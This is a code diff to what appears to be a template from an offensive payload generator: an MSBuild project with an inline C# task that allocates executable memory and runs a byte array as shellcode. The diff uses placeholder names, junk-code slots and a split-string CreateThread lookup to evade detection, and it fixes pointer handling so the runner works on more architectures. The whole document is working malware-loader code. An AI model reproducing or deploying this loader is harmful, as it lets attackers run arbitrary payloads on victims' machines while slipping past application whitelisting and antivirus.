@@ -6,7 +6,7 @@
   <UsingTask
     TaskName="VAR1"
     TaskFactory="CodeTaskFactory"
-    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework[ARCH]\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
     <ParameterGroup/>
     <Task>
       <Using Namespace="System" />
@@ -18,27 +18,24 @@
 	<UsingTask
     TaskName="VAR2"
     TaskFactory="CodeTaskFactory"
-    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework[ARCH]\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
 	<Task>
-	  <Reference Include="System.Management.Automation" />
       <Code Type="Class" Language="cs">
         <![CDATA[
 		using System;
 		using System.IO;
 		using System.Text;
-		using System.Management.Automation;
 		using System.Collections.Generic;
 		using System.Collections.ObjectModel;
 		using Microsoft.Build.Utilities;
 		using Microsoft.Build.Framework;
-		using System.Management.Automation.Runspaces;
 		using System.Runtime.InteropServices;
 		
 		public class VAR2 :  Task, ITask {	
 			private static UInt32 VAR40 = 0x1000;
 			private static UInt32 VAR41 = 0x40;
 			[DllImport("kernel32")]
-			private static extern UInt32 VirtualAlloc(UInt32 VAR21, UInt32 VAR12, UInt32 VAR16, UInt32 VAR8);
+			private static extern IntPtr VirtualAlloc(UInt32 VAR21, UInt32 VAR12, UInt32 VAR16, UInt32 VAR8);
 			[DllImport("kernel32")]
 			private static extern UInt32 WaitForSingleObject(IntPtr VAR4, UInt32 VAR17);
 			[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
@@ -60,8 +57,8 @@
 				IntPtr VAR34 = GetProcAddress(VAR33, "Crea"+"t"+"eTh"+"read");
 				VAR32 VAR35 = (VAR32)Marshal.GetDelegateForFunctionPointer(VAR34, typeof(VAR32));
 [JUNK3]
-				UInt32 VAR42 = VirtualAlloc(0, (UInt32)VAR11.Length, VAR40, VAR41);
-				Marshal.Copy(VAR11, 0, (IntPtr)(VAR42), VAR11.Length);
+				IntPtr VAR42 = VirtualAlloc(0, (UInt32)VAR11.Length, VAR40, VAR41);
+				Marshal.Copy(VAR11, 0, VAR42, VAR11.Length);
 				IntPtr VAR43 = IntPtr.Zero;
 				IntPtr VAR44 = IntPtr.Zero;
 				UInt32 VAR45 = 0;
